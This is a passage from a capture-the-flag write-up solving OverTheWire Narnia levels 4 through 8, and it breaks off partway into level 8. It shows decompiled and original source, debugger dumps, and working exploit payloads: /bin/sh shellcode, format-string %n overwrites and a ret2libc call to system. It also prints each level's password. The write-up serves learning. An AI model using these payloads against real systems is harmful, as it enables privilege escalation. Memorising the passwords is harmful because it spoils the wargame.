0x90909090      0x90909090  0xffffd498:     0x90909090      0x90909090      0x90909090      0x99580b6a  0xffffd4a8:     0x2d686652      0x52e18970      0x2f68686a      0x68736162  0xffffd4b8:     0x6e69622f      0x5152e389      0xcde18953      0xf7fe0080  0xffffd4c8:     0xffffd4cc      0xf7ffd920      0x00000002      0xffffd626Seeing as the NOP sled begins at 0xffffd440, and the shellcode begins at 0xffffd4a4, any address within the bounds of these two addresses will result in the execution of the shellcode. Using the same payload as the one on the attack box with the modification of the address surprisingly results in a “Segmentation fault”.narnia4@narnia:/narnia$ ./narnia4 $(python -c “print ‘A’264+’\x58\xd4\xff\xff’4+’\x90’*100+’\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80’”)Segmentation faultThis was the same problem that occurred in Narnia 2. Just as we did in Narnia 2, tweaking the return address by slightly incrementing it results in the successful execution of the shellcode:  narnia4@narnia:/narnia$ ./narnia4 $(python -c "print 'A'*264  +'\\x90\\xd4\\xff\\xff'*4+'\\x90'*100+'\\x6a\\x0b\\x58\\x99\\x52\\x66\\x68\\x2d\\x70\\x89\\xe1\\x52\\x6a\\x68\\x68\\x2f\\x62\\x61\\x73\\  x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x51\\x53\\x89\\xe1\\xcd\\x80'")  bash-4.4$ whoami  narnia5  bash-4.4$ cat /etc/narnia_pass/narnia5  faimahchiySource Code  #include &lt;string.h&gt;  #include &lt;stdlib.h&gt;  #include &lt;stdio.h&gt;  #include &lt;ctype.h&gt;    extern char **environ;int main(int argc,char **argv){   int i;   char buffer[256];   for(i = 0; environ[i] != NULL; i++)       memset(environ[i], '\\0', strlen(environ[i]));   if(argc&gt;1)       strcpy(buffer,argv[1]);   return 0;  }The source code does not agree with what we saw in Ghidra. This is because Ghidra is converting the assembly instructions into c code, and for loops look similar to while loops. We can see from the source code that the program is setting 256 bytes to a buffer, and it is not performing any sort of boundary checks[10] (a detection of the size of the input before it is used).Narnia 5After exploiting the narnia4 binary, we now have the necessary permissions to execute the narnia5 binary,.Binary AnalysisWe can start by executing the narnia5 binary to see how it normally behaves:We can see from the output that we are meant to change the value for the local variable called i. Furthermore, entering an input such as AAAA into the binary, we can see that the input gets reflected.After fiddling around with the input, we can find that the buffer accepts a total of 63 bytes. We can analyze this binary further with Ghidra.  undefined4 main(undefined4 param_1,int param_2)    {   __uid_t __euid; __uid_t __ruid; size_t sVar1; char local_4c [63]; undefined local_d; int local_c;  local_c = 1; snprintf(local_4c,0x40,*(char **)(param_2 + 4)); local_d = 0; printf("Change i\\'s value from 1 -&gt; 500. "); if (local_c == 500) {     puts("GOOD");   __euid = geteuid();   __ruid = geteuid();   setreuid(__ruid,__euid);   system("/bin/sh"); }   puts("No way...let me give you a hint!"); sVar1 = strlen(local_4c); printf("buffer : [%s] (%d)\\n",local_4c,sVar1); printf("i = %d (%p)\\n",local_c,&amp;local_c); return 0;  }There is a local_c variable being set to 1 (this is the i) and stays unchanged. We can see that there is an if statement, and within it /bin/sh gets executed as the narnia6 user. However, due to the local_c variable staying unchanged, the if statement is never run. From the code, we can deduce that there is a vulnerability in the following line: snprintf(local_4c,0x40,*(char **)(param_2 + 4));. This may be surprising, as the manual page for snprintf encourages its usage:BUGS      Because sprintf() and vsprintf() assume an arbitrarily long string, callers must be careful not to overflow the actual space; this is often impossible to assure. Note that the length of the strings produced is locale-de‐pendent and difficult to predict.  Use snprintf() and vsnprintf() instead (or asprintf(3) and vasprintf(3)).       Code such as printf(foo); often indicates a bug, since foo may contain a % character. If foo comes from un‐trusted user input, it may contain %n, causing the printf() call to write to memory and creating a security hole.The security hole within this function lies in the fact that it uses a buffer of a fixed length with no boundary checks[11].(snprintf) is safe as you long as you provide the correct length for the buffer. snprintf does guarantee that the buffer won’t be overwritten, but it does not guarantee null-termination.Format String ExploitTherefore, upon providing a format character such as %x, the function will spit out addresses from the stack.POCnarnia5@narnia:/narnia$ ./narnia5 %xChange i’s value from 1 -&gt; 500. No way…let me give you a hint!buffer : [f7fc5000] (8)i = 1 (0xffffd5f0)Despite only providing %x as the input, we can see the buffer contains 8 bytes. The methodology behind a format string attack is finding the address of a local variable that we would like to overwrite (this is given to us as 0xffffd5f0). After discovering the address of the targeted variable, we need to determine where the input gets stored in memory. After finding this information, we can finally overwrite the variable by providing its address followed by the %n format specifier.Providing the input string of AAAA followed by the %x format specifier, we can immediately see the position of the input in the stack:  narnia5@narnia:/narnia$ ./narnia5 AAAA%x  Change i's value from 1 -&gt; 500. No way...let me give you a hint!  buffer : [AAAA41414141] (12)  i = 1 (0xffffd5f0)Therefore, replacing AAAA with the address of the local i variable followed by the %n format specifier will successfully overwrite the variable.  narnia5@narnia:/narnia$ ./narnia5 $(python -c "print '\\xf0\\xd5\\xff\\xff%n'")  Change i's value from 1 -&gt; 500. No way...let me give you a hint!  buffer : [] (4)  i = 4 (0xffffd5f0)Observe that the value for the variable is 4 which matches the amount of bytes in the buffer. Therefore, the amount of bytes inside the buffer corresponds to the overwriting value for the variable.Controlling Variable ValueAfter verifying the ability for overwriting the local variable, we are left with the task of controlling its value. This can be done by padding the buffer using two different methods:Method 1We can use a specifier for the position of the input within the stack.  narnia5@narnia:/narnia$ ./narnia5 $(python -c 'print "\\xe0\\xd5\\xff\\xff"+"%496x%1$n"')  Change i's value from 1 -&gt; 500. GOOD  $ whoami  narnia6In the method above, the %1 specifies that the input is in position 1 within the stack. This method, however, is unstable in comparison to the second method. The payload used does not work when using single quotes around the input, rather only double quotes work.Method 2This method copies the address for the i variable twice before padding it with the necessary amount of bytes. Inputting the address twice was found to be necessary (after a lot of trial and error).  narnia5@narnia:/narnia$ /narnia/narnia5 $(python -c 'print "\\xd0\\xd5\\xff\\xff\\xd0\\xd5\\xff\\xff%492x%n"')                                                                        Change i's value from 1 -&gt; 500. GOOD  $ cat /etc/narnia_pass/narnia6neezocaengSource Code  #include &lt;stdio.h&gt;  #include &lt;stdlib.h&gt;  #include &lt;string.h&gt;    int main(int argc, char **argv){       int i = 1;       char buffer[64];       snprintf(buffer, sizeof buffer, argv[1]);         buffer[sizeof (buffer) - 1] = 0;       printf("Change i's value from 1 -&gt; 500. ");       if(i==500){               printf("GOOD\\n");         setreuid(geteuid(),geteuid());                 system("/bin/sh");         }       printf("No way...let me give you a hint!\\n");       printf("buffer : [%s] (%d)\\n", buffer, strlen(buffer));       printf ("i = %d (%p)\\n", i, &amp;i);       return 0;  }Narnia 6Binary AnalysisBehaviorGoing onto analysing the narnia6 binary, we can see that it expects two arguments:  narnia6@narnia:/narnia$ ./narnia6  ./narnia6 b1 b2When providing two normal inputs as arguments to the program, nothing out of the ordinary seems to happen:narnia6@narnia:/narnia$ ./narnia6 A BAGhidra  void main(int param_1,undefined4 *param_2)    {   size_t sVar1;   uint uVar2;   uint uVar3;   __uid_t __euid;   __uid_t __ruid;   char local_20 [8];   char local_18 [8];   code *local_10;   int local_c;      local_10 = puts; if (param_1 != 3) {     printf("%s b1 b2\\n",*param_2);                   /* WARNING: Subroutine does not return */   exit(-1);   }   local_c = 0; while (*(int *)(environ + local_c * 4) != 0) {     sVar1 = strlen(*(char **)(environ + local_c * 4));     memset(*(void **)(environ + local_c * 4),0,sVar1);     local_c = local_c + 1;   }   local_c = 3; while (param_2[local_c] != 0) {     sVar1 = strlen((char *)param_2[local_c]);     memset((void *)param_2[local_c],0,sVar1);     local_c = local_c + 1;   }   strcpy(local_18,(char *)param_2[1]);   strcpy(local_20,(char *)param_2[2]);   uVar2 = (uint)local_10 &amp; 0xff000000;   uVar3 = get_sp(); if (uVar2 == uVar3) {                   /* WARNING: Subroutine does not return */   exit(-1);   }   __euid = geteuid();   __ruid = geteuid();   setreuid(__ruid,__euid);   (*local_10)(local_18);                   /* WARNING: Subroutine does not return */ exit(1);  }Eight bytes are allocated to buffers local_18 and local_20 which most likely correspond to the two arguments that the program expects. The program then performs harmless operations within the while loops. Eventually, the strcpy function is run on the two arguments as can be seen in the following lines:  strcpy(local_18,(char *)param_2[1]);  strcpy(local_20,(char *)param_2[2]);Within these two lines lie the vulnerability of the program. Eight bytes are being allocated to the local_18 and local_20 variables, which are then getting passed into the strcpy function with any kind of boundary checks being performed beforehand. The potential danger of this code is outlined within the “BUGS” subsection located in the manual page for the strcpy function:If the destination string of a strcpy() is not large enough, then anything might happen. Overflowing fixed-length string buffers is a favorite cracker technique for taking complete control of the machine. Any time a program reads or copies data into a buffer, the program first needs to check that there’s enough space. This may be unnecessary if you can show that overflow is impossible, but be careful: programs can get changed over time, in ways that may make the impossible possible.Additionally, it is important to check the security of the narnia6 binary with the checksec command to find binary security settings:  ┌─[0xd4y@Writeup]─[~/business/other/overthewire/narnia/6]  └──╼ $checksec narnia6  [*] '/home/0xd4y/business/other/overthewire/narnia/6/narnia6'   Arch:     i386-32-little   RELRO:    No RELRO   Stack:    No canary found   NX:       NX enabled   PIE:      No PIE (0x8048000)The NX bit is enabled, and therefore shellcode will be of no use for exploiting this program. However, this binary may be vulnerable to a ret2libc (return-to-lib-c) attack, as well as to Return Oriented Programming (ROP), though the latter is untested.Ret2libc AttackThis kind of attack is useful when exploiting a binary whose NX bit is enabled, but has a buffer overflow vulnerability. The attack works by replacing pointing the return address of the binary to a subroutine / function that is already present within the binary.[12] Typically, the return address is replaced with an address pointing to the system function located within the stdlib library (as this is a function in c that executes system commands).POCTo demonstrate the functionality of the system function, we can create a simple c program that runs the ls -la command:  #include &lt;stdlib.h&gt;  int main(){       system("ls -la");   return 0;  }Compiling and running this program, we see that it successfully executes the command:  ┌─[0xd4y@Writeup]─[~/business/other/overthewire/narnia/6/poc]  └──╼ $gcc poc.c -o poc  ┌─[0xd4y@Writeup]─[~/business/other/overthewire/narnia/6/poc]  └──╼ $./poc  total 24  drwxr-xr-x 1 0xd4y 0xd4y    16 May 11 17:08 .  drwxr-xr-x 1 0xd4y 0xd4y   200 May 11 17:07 ..  \-rwxr-xr-x 1 0xd4y 0xd4y 16608 May 11 17:08 poc  \-rw-r--r-- 1 0xd4y 0xd4y    71 May 11 17:07 poc.cSeeing as we can ssh into the target machine with credentials that we have received from the previous task, we can compile this same code on the target system to determine the location of the system function in memory (in other words, we do not have to leak the system function’s address). Using this address, we can point the address of the narnia6 binary to the system function and pass a command to it.Determining System AddressFirst, we must compile the program in 32 bit format as follows:  narnia6@narnia:/tmp/poc$ gcc -m32 poc.c -o poc  narnia6@narnia:/tmp/poc$ ./poc  total 276drwxr-sr-x    2 narnia6 root   4096 May 11 18:15 .  drwxrws-wt 2040 root    root 262144 May 11 18:15 ..  \-rwxr-xr-x    1 narnia6 root   7460 May 11 18:15 poc  \-rw-r--r--    1 narnia6 root     84 May 11 18:15 poc.cAfter doing so, we can start debugging the program with gdb:  narnia6@narnia:/tmp/poc$ gdb -q ./poc                                                  Reading symbols from ./poc...(no debugging symbols found)...done.  (gdb) b *main                                                                                                                                                        Breakpoint 1 at 0x5a0                                                                 (gdb) r                                                                                Starting program: /tmp/poc/poc                                                                                                     Breakpoint 1, 0x565555a0 in main ()        (gdb) disass main                      Dump of assembler code for function main:  \=&gt; 0x565555a0 &lt;+0\&gt;:     lea    0x4(%esp),%ecx                                          0x565555a4 &lt;+4\&gt;:     and    $0xfffffff0,%esp                    0x565555a7 &lt;+7\&gt;:     pushl  -0x4(%ecx)  0x565555aa &lt;+10\&gt;:    push   %ebp        0x565555ab &lt;+11\&gt;:    mov    %esp,%ebp                                                0x565555ad &lt;+13\&gt;:    push   %ebx                                                    0x565555ae &lt;+14\&gt;:    push   %ecx        0x565555af &lt;+15\&gt;:    call   0x565555dc &lt;__x86.get_pc_thunk.ax&gt;                      0x565555b4 &lt;+20\&gt;:    add    $0x1a4c,%eax  0x565555b9 &lt;+25\&gt;:    sub    $0xc,%esp  0x565555bc &lt;+28\&gt;:    lea    -0x19a0(%eax),%edx                                      0x565555c2 &lt;+34\&gt;:    push   %edx                                                    0x565555c3 &lt;+35\&gt;:    mov    %eax,%ebx    0x565555c5 &lt;+37\&gt;:    call   0x56555400 &lt;system@plt&gt;                                  0x565555ca &lt;+42\&gt;:    add    $0x10,%esp                                              0x565555cd &lt;+45\&gt;:    mov    $0x0,%eax  0x565555d2 &lt;+50\&gt;:    lea    -0x8(%ebp),%esp                                          0x565555d5 &lt;+53\&gt;:    pop    %ecx                                                    0x565555d6 &lt;+54\&gt;:    pop    %ebx        0x565555d7 &lt;+55\&gt;:    pop    %ebp      0x565555d8 &lt;+56\&gt;:    lea    -0x4(%ecx),%esp  0x565555db &lt;+59\&gt;:    ret       End of assembler dump.            Now with a breakpoint at main, we can see all of the corresponding addresses to each assembly instruction. Most notably, system call is at 0x565555c5,so it follows that we should set a breakpoint there.  (gdb) b *0x565555c5               Breakpoint 2 at 0x565555c5(gdb) c  Continuing.    Breakpoint 2, 0x565555c5 in main ()  (gdb) x/s $edx  0x565555c5:     "ls -la"We can see that the ls -la command is in the edx register with an address of 0x565555c5. To get the address of the system function, we can simply type the following in the gdb console:  (gdb) p system$1 = {&lt;text variable, no debug info&gt;} 0xf7e4c850 &lt;system&gt;The system is located at 0xf7e4c850.ExploitTherefore, we can flood the buffer with 8 bytes before overwriting the eip. Accordingly, the exploit will look like the following:COMMAND + JUNK + \x50\xc8\xe4\xf7 + ‘ ‘ + JUNKUsing this exploit template, we can run the narnia6 binary in gdb and pass this payload::  (gdb) r $(python -c "print 'ls'+'A'*6+'\\x50\\xc8\\xe4\\xf7'+' '+'B'*4")  The program being debugged has been started already.  Start it from the beginning? (y or n) y  Starting program: /narnia/narnia6 $(python -c "print 'ls'+'A'*6+'\\x50\\xc8\\xe4\\xf7'+' '+'B'*4")  sh: 1: lsAAAAAAP: not found  [Inferior 1 (process 21970) exited with code 01]Note how the command + the junk (namely ‘ls’ + ‘A’ * 6) is equal to eight bytesWe can see that the sh command is trying to execute lsAAAAAAP, which is not a command. However, this can be easily resolved by adding a semicolon to the end of the ls command using one less ‘A’:  (gdb) r $(python -c "print 'ls;'+'A'*5+'\\x50\\xc8\\xe4\\xf7'+' '+'B'*4")  Starting program: /narnia/narnia6 $(python -c "print 'ls;'+'A'*5+'\\x50\\xc8\\xe4\\xf7'+' '+'B'*4")  narnia0    narnia1    narnia2    narnia3    narnia4    narnia5    narnia6    narnia7    narnia8  narnia0.c  narnia1.c  narnia2.c  narnia3.c  narnia4.c  narnia5.c  narnia6.c  narnia7.c  narnia8.csh: 1: AAAAAP: not found  [Inferior 1 (process 22579) exited with code 01]The ls command was successfully executed. Running the narnia6 binary outside of gdb and implementing the sh command instead, we get a shell as narnia7:  narnia6@narnia:/narnia$ ./narnia6 $(python -c "print 'sh;'+'A'*5+'\\x50\\xc8\\xe4\\xf7'+' '+'B'*4")  $ whoami  narnia7  $ cat /etc/narnia_pass/narnia7  ahkiaziphuSource Code  #include &lt;stdio.h&gt;  #include &lt;stdlib.h&gt;  #include &lt;string.h&gt;    extern char **environ;// tired of fixing values...  // - morla  unsigned long get_sp(void) {        __asm__("movl %esp,%eax\\n\\t"              "and $0xff000000, %eax"              );  }int main(int argc, char *argv[]){       char b1[8], b2[8];       int  (*fp)(char *)=(int(*)(char *))&amp;puts, i;       if(argc!=3){ printf("%s b1 b2\\n", argv[0]); exit(\-1); }       /* clear environ */       for(i=0; environ[i] != NULL; i++)               memset(environ[i], '\\0', strlen(environ[i]));       /* clear argz    */       for(i=3; argv[i] != NULL; i++)               memset(argv[i], '\\0', strlen(argv[i]));       strcpy(b1,argv[1]);       strcpy(b2,argv[2]);       //if(((unsigned long)fp &amp; 0xff000000) == 0xff000000)       if(((unsigned long)fp &amp; 0xff000000) == get_sp())               exit(\-1);         setreuid(geteuid(),geteuid());     fp(b1);       exit(1);  }Once again, Ghidra confused the for loop with a while loop. In any case, the operations within these loops were of no interest in regards to exploiting the binary. Note that the stdlib library was included in the binary which allowed us to use the system function.Narnia 7After grabbing the credentials of the narnia7 user, we can ssh into the box as the compromised user and access the narnia7 binary.Binary AnalysisBehaviorWhen executing it, we are met with a prompt that expects an input as an argument:  narnia7@narnia:/narnia$ ./narnia7  Usage: ./narnia7 &lt;buffer&gt;Putting a simple input such as ‘A’, we can see that nothing out of the ordinary occurs:  narnia7@narnia:/narnia$ ./narnia7 A  goodfunction() = 0x80486ff  hackedfunction() = 0x8048724    before : ptrf() = 0x80486ff (0xffffd568)  I guess you want to come to the hackedfunction...  Welcome to the goodfunction, but i said the Hackedfunction..GhidraThe program exits after printing out the above text. We can use Ghidra to further analyse how the binary functions:There are four functions of interest within the program: main, vuln, goodfunction, and hackedfunction. The main function takes an argument as input and passes it onto the vuln function. This vuln function allocates 128 bytes to the argument. Going further down this function, we can see that the local_84 variable is being assigned to the address of goodfunction.Looking at the code for goofunction, we see that the function simply prints out a message and exits. Interestingly, toward the last line of the vuln function, the snprintf function is called and uses local_84 as an argument. Therefore, it can be deduced that this program is most likely vulnerable to a format string exploit. Seeing as hackedfunction calls /bin/sh with setuid privileges, if the local_88 variable is overwritten to point to the address of hackedfunction, then we will receive a shell as the narnia8 user.Format String ExploitThe methodology to exploiting this binary is the same as the one outlined in Narnia 2. We can construct a payload that will look like the following:(address to local_84) + %PADDINGxThe padding will correspond to the decimal value of the address for hackedfunction so as to overwrite the value of the local_84 with the appropriate address. Note that the program will convert this decimal value into hexadecimal, and the hackedfunction will therefore be executed.From executing the binary, we saw that the hacked address is located at 0x8048724. Converting this hexadecimal value to decimal, we see that it is equivalent to 134514468. Furthermore, the binary printed out the value for local_84 at 0xffffd568. Therefore, a string comprised of the address to this variable in little endian format (as this binary is in little endian) followed by a padding of 134514468 will result in the execution of hackedfunction:  narnia7@narnia:/narnia$ ./narnia7 $(python -c "print '\\x58\\xd5\\xff\\xff'+'%134514468x%n'")                                                                                    goodfunction() = 0x80486ff  hackedfunction() = 0x8048724    before : ptrf() = 0x80486ff (0xffffd558)  I guess you want to come to the hackedfunction...  Way to go!!!!$ whoami  narnia8$ cat /etc/narnia_pass/narnia8  mohthuphogSource Code  #include &lt;stdio.h&gt;  #include &lt;stdlib.h&gt;  #include &lt;string.h&gt;  #include &lt;stdlib.h&gt;  #include &lt;unistd.h&gt;    int goodfunction();  int hackedfunction();    int vuln(const char *format){       char buffer[128];       int (*ptrf)();       memset(buffer, 0, sizeof(buffer));       printf("goodfunction() = %p\\n", goodfunction);       printf("hackedfunction() = %p\\n\\n", hackedfunction);           ptrf = goodfunction;       printf("before : ptrf() = %p (%p)\\n", ptrf, &amp;ptrf);       printf("I guess you want to come to the hackedfunction...\\n");         sleep(2);         ptrf = goodfunction;       snprintf(buffer, sizeof buffer, format);       return ptrf();  }int main(int argc, char **argv){       if (argc &lt;= 1){               fprintf(stderr, "Usage: %s &lt;buffer&gt;\\n", argv[0]);               exit(\-1);         }       exit(vuln(argv[1]));  }    int goodfunction(){       printf("Welcome to the goodfunction, but i said the Hackedfunction..\\n");         fflush(stdout);       return 0;  }    int hackedfunction(){       printf("Way to go!!!!");             fflush(stdout);         setreuid(geteuid(),geteuid());         system("/bin/sh");       return 0;  }Narnia 8After exploiting a total of eight binaries, we are left with the task of exploiting the ninth and final binary: narnia8.Binary AnalysisWe can start by executing the binary to see how it behaves:  narnia8@narnia:/narnia$ ./narnia8  ./narnia8 argumentSimilar to the previous binaries, this program expects an argument. Providing a normal input does not seem to do anything except print that same value back out:  narnia8@narnia:/narnia$ ./narnia8 A  AFurthermore, when providing a large input such as 5000 ‘A’s, no segmentation fault occurred.GhidraWe can further analyse this binary using Ghidra to understand the inner workings of the program:There are two interesting functions: main and func. The main function simply gets the argument and passes it into func. Within this function are 2 global variables: local_1c and local_8. Twenty bytes are allocated to the former, while the latter is set to the argument. The local_1c variable has all of its contents set to 0. Within the while loop appears to be a sort of operation that is setting local_1c equivalent to some index within local_8. Just as in the previous binaries, Ghidra may have mistook a for loop for a while loop. It is possible that this segment in the code actually looks like the following:  for(i\=0; local_8[i] != '\\0'; i++){       local_1c[i] = local_8[i];     i = i + 1;  }After performing this operation, the program prints the contents of local_1c. Looking at this for loop, we can see that the vulnerability lies within the fact that 20 bytes are allocated to the local_1c variable, but an argument of greater than 20 bytes can be inputted.Additionally, running checksec on the binary reveals that the NX bit is also disabled:  ┌─[0xd4y@Writeup]─[~/business/other/overthewire/narnia/8]  └──╼ $checksec narnia8  [*] '/home/0xd4y/business/other/overthewire/narnia/8/narnia8'   Arch:     i386-32-little   RELRO:    No RELRO   Stack:    No canary found   NX:       NX disabled   PIE:      No PIE (0x8048000)   RWX:      Has RWX segmentsTherefore, the return address of func could potentially be overwritten to point to shellcode.Buffer OverflowPassing a large input into the argument of the program did not result in a segmentation fault.GdbThe program can be analyzed in a dynamic environment using gdb. This will help in further understanding how the binary works. Before providing an input, we must first put a break point toward the end of func right before the program exits:  pwndbg&gt; disass func                                                                                                                                                  Dump of assembler code for function func:                                                                                                                                      0x0804841b &lt;+0\&gt;:     push   ebp                                                                                                                                             0x0804841c &lt;+1\&gt;:     mov    ebp,esp                                                                                                                                         0x0804841e &lt;+3\&gt;:     sub    esp,0x18                                                                                                                                       0x08048421 &lt;+6\&gt;:     mov    eax,DWORD PTR [ebp+0x8]                                  0x08048424 &lt;+9\&gt;:     mov    DWORD PTR [ebp\-0x4],eax                                                                                                                         0x08048427 &lt;+12\&gt;:    push   0x14                                                     0x08048429 &lt;+14\&gt;:    push   0x0                                                     0x0804842b &lt;+16\&gt;:    lea    eax,[ebp\-0x18]                                          0x0804842e &lt;+19\&gt;:    push   eax                                                     0x0804842f &lt;+20\&gt;:    call   0x8048300 &lt;memset@plt&gt;                                                                                                                          0x08048434 &lt;+25\&gt;:    add    esp,0xc                                                 0x08048437 &lt;+28\&gt;:    mov    DWORD PTR ds:0x80497b0,0x0                               0x08048441 &lt;+38\&gt;:    jmp    0x8048469 &lt;func+78\&gt;                                      0x08048443 &lt;+40\&gt;:    mov    eax,ds:0x80497b0                                         0x08048448 &lt;+45\&gt;:    mov    edx,DWORD PTR ds:0x80497b0                                                                                                                     0x0804844e &lt;+51\&gt;:    mov    ecx,edx                                                                                                                                         0x08048450 &lt;+53\&gt;:    mov    edx,DWORD PTR [ebp\-0x4]                                  0x08048453 &lt;+56\&gt;:    add    edx,ecx                                                 0x08048455 &lt;+58\&gt;:    movzx  edx,BYTE PTR [edx]                                      0x08048458 &lt;+61\&gt;:    mov    BYTE PTR [ebp+eax*1\-0x18],dl  0x0804845c &lt;+65\&gt;:    mov    eax,ds:0x80497b0  0x08048461 &lt;+70\&gt;:    add    eax,0x1  0x08048464 &lt;+73\&gt;:    mov    ds:0x80497b0,eax  0x08048469 &lt;+78\&gt;:    mov    eax,ds:0x80497b0       0x0804846e &lt;+83\&gt;:    mov    edx,eax  0x08048470 &lt;+85\&gt;:    mov    eax,DWORD PTR [ebp\-0x4]  0x08048473 &lt;+88\&gt;:    add    eax,edx  0x08048475 &lt;+90\&gt;:    movzx  eax,BYTE PTR [eax]  0x08048478 &lt;+93\&gt;:    test   al,al  0x0804847a &lt;+95\&gt;:    jne    0x8048443 &lt;func+40\&gt;  0x0804847c &lt;+97\&gt;:    lea    eax,[ebp\-0x18]  0x0804847f &lt;+100\&gt;:   push   eax  0x08048480 &lt;+101\&gt;:   push   0x8048550  0x08048485 &lt;+106\&gt;:   call   0x80482e0 &lt;printf@plt&gt;  0x0804848a &lt;+111\&gt;:   add    esp,0x8  0x0804848d &lt;+114\&gt;:   nop  0x0804848e &lt;+115\&gt;:   leave   0x0804848f &lt;+116\&gt;:   ret   A breakpoint was then set at the nop operation, and an input of 5 A’s was passed (this amount was chosen arbitrarily):  pwndbg&gt; b *0x0804848d                                                                                                                                                          Breakpoint 1 at 0x804848d                                                                                                                                                      pwndbg&gt; r $(python -c "print 'A'*5")                                                                                                                                          Starting program: /home/0xd4y/business/other/overthewire/narnia/8/narnia8 $(python -c "print 'A'*5")                                                                          AAAAA                                                                                                                                                                                                                                                                                                                                                       Breakpoint 1, 0x0804848d in func ()                                                                                                                                        Local_8 Address BehaviorThe stack pointer can now be analyzed:  pwndbg&gt; x/40x $esp  0xffffd044:     0x41414141      0x00000041      0x00000000      0x00000000  0xffffd054:     0x00000000      0xffffd2f9      0xffffd068      0x080484a7  0xffffd064:     0xffffd2f9      0x00000000      0xf7ddfe46      0x00000002  0xffffd074:     0xffffd114      0xffffd120      0xffffd0a4      0xffffd0b4Note how there are 5 A’s starting at 0xffffd044 followed by 15 0 bytes. The 0’s are a result of the memset function. These 0’s are then followed by the 0xffffd2f9 address. Examining this address reveals that it is pointing to the local_8 buffer:  pwndbg&gt; x/s 0xffffd2f9  0xffffd2f9:     "AAAAA"Interestingly, running the program again but inputting 6 A’s instead of 5 results in a decrement of 1 to the local_8 address:  pwndbg&gt; x/40x $esp  0xffffd044:     0x41414141      0x00004141      0x00000000      0x00000000  0xffffd054:     0x00000000      0xffffd2f8      0xffffd068      0x080484a7  0xffffd064:     0xffffd2f8      0x00000000      0xf7ddfe46      0x00000002Furthermore, when inputting more than 20 bytes, the address of local_8 gets overwritten by one byte:  0xffffd034:     0x41414141      0x41414141      0x41414141      0x41414141  0xffffd044:     0x41414141      0xffffd241      0xffffd058      0x080484a7However, when exactly 20 bytes are inputted followed by the address of local_8 and some junk, we are able to flood into other areas of memory:Payload:A20 + ADDRESS_TO_LOCAL_8 + ‘A’6When we passed 6 A’s into the buffer, the address to local_8 was 0xfffd2f8. If we are to input 14 more A’s followed by the address to local_8 (which is four bytes) followed by another 6 A’s, then the resulting address to local_8 would be 0xffffd2f8 - (14+4+6).  \&gt;&gt;\&gt; hex(0xffffd2f8\-24)  '0xffffd2e0'Using this address, we can construct the payload as follows:  pwndbg&gt; r $(python -c "print 'A'*20+'\\xe0\\xd2\\xff\\xff'+'A'*6")  Starting program: /home/0xd4y/business/other/overthewire/narnia/8/narnia8 $(python -c "print 'A'*20+'\\xe0\\xd2\\xff\\xff'+'A'*6")  AAAAAAAAAAAAAAAAAAAAAAAAAA                                             Breakpoint 1, 0x0804848d in func ()                                          Now looking at the stack pointer, we see that we have successfully flooded memory past the local_8 address:  pwndbg&gt; x/40x $esp  0xffffd024:     0x41414141      0x41414141      0x41414141      0x41414141  0xffffd034:     0x41414141      0xffffd2e0      0x41414141      0x08044141  0xffffd044:     0xffffd2e0      0x00000000      0xf7ddfe46      0x00000002Incidentally, the reason why we were only able to overwrite other areas of memory only after including the address of the buffer in the payload, is because of the for loop within the program. When the address to local_8 is overwritten, the for loop is false and data stops getting written to local_1c.Overwriting func Return AddressIt is important to note that in the stack pointer, the return address of func is present shortly after the buffer:  pwndbg&gt; x/40x $esp                                                                                                                                                           0xffffd034:     0x41414141      0x41414141      0x41414141      0x41414141                                                                                                   0xffffd044:     0x41414141      0xffffd2ea      0xffffd058      0x080484a7                                                                                                   0xffffd054:     0xffffd2ea      0x00000000      0xf7ddfe46      0x00000002                                                                                                   0xffffd064:     0xffffd104      0xffffd110      0xffffd094      0xffffd0a4                                                                                                   0xffffd074:     0xf7ffdb40      0xf7fcb410      0xf7fa6000      0x00000001                                                                                                   0xffffd084:     0x00000000      0xffffd0e8      0x00000000      0xf7ffd000                                                                                                   0xffffd094:     0x00000000      0xf7fa6000      0xf7fa6000      0x00000000                                                                                                   0xffffd0a4:     0xe752d891      0xa309e681      0x00000000      0x00000000           0xffffd0b4:     0x00000000      0x00000002      0x08048320      0x00000000                                                                                                   0xffffd0c4:     0xf7fe9740      0xf7fe4080      0xf7ffd000      0x00000002                                                                                                                                                                                                                                                                                                                                                                                       More specifically, it is at 0x080484a7.  pwndbg&gt; x/x 0x080484a7                                                                                                                                                       0x80484a7 &lt;main+23\&gt;:    0x83   We can verify that this is the return address of func by disassembling the main function:  pwndbg&gt; disass main  Dump of assembler code for function main:  0x08048490 &lt;+0\&gt;:     push   ebp  0x08048491 &lt;+1\&gt;:     mov    ebp,esp  0x08048493 &lt;+3\&gt;:     cmp    DWORD PTR [ebp+0x8],0x1  0x08048497 &lt;+7\&gt;:     jle    0x80484ac &lt;main+28\&gt;  0x08048499 &lt;+9\&gt;:     mov    eax,DWORD PTR [ebp+0xc]  0x0804849c &lt;+12\&gt;:    add    eax,0x4  0x0804849f &lt;+15\&gt;:    mov    eax,DWORD PTR [eax]  0x080484a1 &lt;+17\&gt;:    push   eax  0x080484a2 &lt;+18\&gt;:    call   0x804841b &lt;func&gt;  0x080484a7 &lt;+23\&gt;:    add    esp,0x4  0x080484aa &lt;+26\&gt;:    jmp    0x80484bf &lt;main+47\&gt;  0x080484ac &lt;+28\&gt;:    mov    eax,DWORD PTR [ebp+0xc]  0x080484af &lt;+31\&gt;:    mov    eax,DWORD PTR [eax]  0x080484b1 &lt;+33\&gt;:    push   eax  0x080484b2 &lt;+34\&gt;:    push   0x8048554  0x080484b7 &lt;+39\&gt;:    call   0x80482e0 &lt;printf@plt&gt;  0x080484bc &lt;+44\&gt;:    add    esp,0x8  0x080484bf &lt;+47\&gt;:    mov    eax,0x0  0x080484c4 &lt;+52\&gt;:    leave   0x080484c5 &lt;+53\&gt;:    ret   End of assembler dump.Note that main+23 comes right after the call to func. Therefore, if we overwrite this return address of func to the address of the shellcode (just as we did in Narnia 2 and Narnia 4), then the shellcode will be executed consequently giving a shell as the narnia9 user.ShellcodeNow on the target machine, we can run the narnia8 binary with an input of 20 A’s and pipe it over to xxd to get the address of local_8:  narnia8@narnia:/narnia$ ./narnia8 $(python -c "print 'A'*20")|xxd                    00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA                  00000010: 4141 4141 d1d7 ffff e8d5 ffff a784 0408  AAAA............                                        